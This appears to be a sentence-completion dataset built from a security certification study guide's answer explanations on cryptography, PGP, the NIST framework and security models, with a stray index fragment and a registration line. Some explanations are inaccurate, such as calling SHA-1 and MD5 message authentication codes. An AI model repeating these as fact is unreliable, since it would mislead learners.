while you may have text as input to an encryption,"while you may have text as input to an encryption process , the word text would be ambiguous in this context"
where certificate authorities use a centralized mechanism for verification of,"where certificate authorities use a centralized mechanism for verification of users or certificate subjects , pgp uses a decentralized model"
"pgp calls this a web of trust , where individual users sign keys that","pgp calls this a web of trust , where individual users sign keys that belong to other people to validate that they are who they say they are"
integrity is part of the cia triad but isn ’ t the principle,integrity is part of the cia triad but isn ’ t the principle that ties a signed message back to the subject of the signing certificate
"instead , non-repudiation means someone can ’ t say they didn","instead , non-repudiation means someone can ’ t say they didn ’ t send a message if it was signed with their key"
this assumes the key was in their possession and,"this assumes the key was in their possession and password protected , meaning no one else could use it"
it is a process that allows two parties to an encrypted conversation,it is a process that allows two parties to an encrypted conversation to mutually derive the same key starting with the same base value
"finally , the third key is used to encrypt the","finally , the third key is used to encrypt the ciphertext that resulted from the decryption with the second key"
"instead , elliptic curve cryptography relies on the assumption that determining a discrete logarithm of","instead , elliptic curve cryptography relies on the assumption that determining a discrete logarithm of a point on an elliptic curve can ’ t be computed in a consistent way"
the keys that result from elliptic key cryptography are actually,the keys that result from elliptic key cryptography are actually smaller than those that result from factoring with large prime numbers
it relates to a mathematical problem called the birthday paradox,"it relates to a mathematical problem called the birthday paradox , but two values being the same is not a paradox"
because it ’ s the public key that is used to encrypt messages to the owner of,"because it ’ s the public key that is used to encrypt messages to the owner of the paired private key , this type of encryption is commonly referred to as public key cryptography"
the only thing you can do with the public key is,the only thing you can do with the public key is encrypt a message that could be decrypted by the matched private key
symmetric key encryption is generally used instead of asymmetric key encryption because symmetric key encryption,"symmetric key encryption is generally used instead of asymmetric key encryption because symmetric key encryption uses shorter keys and fewer resources , resulting in shorter times for encryption and decryption"
symmetric key is not easier to implement and asymmetric key is not,"symmetric key is not easier to implement and asymmetric key is not encumbered with patents , which is why c and d are wrong"
"when both symmetric and asymmetric keys are used , typically where the asymmetric key","when both symmetric and asymmetric keys are used , typically where the asymmetric key is used to protect the symmetric key , it is called a hybrid cryptosystem"
the correct answer is message authentication code because sha-1 and md-5 are used,the correct answer is message authentication code because sha-1 and md-5 are used as message authentication codes to ensure that a message has not been tampered with
"since there are two keys , pgp uses asymmetric","since there are two keys , pgp uses asymmetric key encryption , sometimes known as public key encryption"
"an n-tier application , sometimes called a multitier","an n-tier application , sometimes called a multitier application , can have as many tiers as necessary"
"while you may think there are three , there could be","while you may think there are three , there could be more tiers than that , depending on how the application is designed"
while you could theoretically represent a relational database in,"while you could theoretically represent a relational database in json , it wouldn ’ t be the most efficient"
"sql is a language used to query relational databases , and document-based","sql is a language used to query relational databases , and document-based databases may be more likely to use other document types to store data"
the nist cybersecurity framework specifies five functions :,"the nist cybersecurity framework specifies five functions : identify , protect , detect , response , recover"
micro channel architecture is a specification for peripherals to interact with,micro channel architecture is a specification for peripherals to interact with hardware systems that was proposed and implemented by ibm in the 1990s
service-oriented architecture is an older concept that has,"service-oriented architecture is an older concept that has been revived , to a degree , by microservices"
infrastructure as a service is a cloud-based offering where companies,infrastructure as a service is a cloud-based offering where companies may just acquire servers they can use for their infrastructure
the clark-wilson integrity model specifies constrained data items ( cdis ) and unconstrained,the clark-wilson integrity model specifies constrained data items ( cdis ) and unconstrained data items ( udis ) that are used when identifying and implementing rules
the other answers either don ’ t exist or,the other answers either don ’ t exist or refer to things that are not related to information security
emulation is where applications may be run on a processor,emulation is where applications may be run on a processor they were not compiled for so the operation codes are emulated
"aws is amazon web services , which can offer application","aws is amazon web services , which can offer application virtualization services but is not a type of application virtualization"
you can ’ t do any of the other functions until you have,"you can ’ t do any of the other functions until you have been through identify , which defines business needs and essential assets for the business"
"commonly , you will see the following in an n-tier application","commonly , you will see the following in an n-tier application design as core features : browser , application server , database server"
there may also be security functions and load balancers as,there may also be security functions and load balancers as well as a web server in front of the application server
"when you focus just on the core , though ,","when you focus just on the core , though , the application server is in the middle of the architecture"
oracle is a company that owns relational database servers,"oracle is a company that owns relational database servers , including mysql , but only mysql is open-source"
the bell-lapadula simple security property says a subject can not,the bell-lapadula simple security property says a subject can not read an object at a higher level than the subject
"py , 255 process injection meterpreter and , 268module , 267–268 protocols , 12 irc ( internet relay chat ) , 312","py , 255 process injection meterpreter and , 268module , 267–268 protocols , 12 irc ( internet relay chat ) , 312 ptk ( pair-wise transient key ) , 395ptr ( pointer ) records , 324python , 236 , 516 malware writing , 305–306windows-exploit-suggester"
"complete the required registration information , including","complete the required registration information , including answering the security verification to prove book ownership"
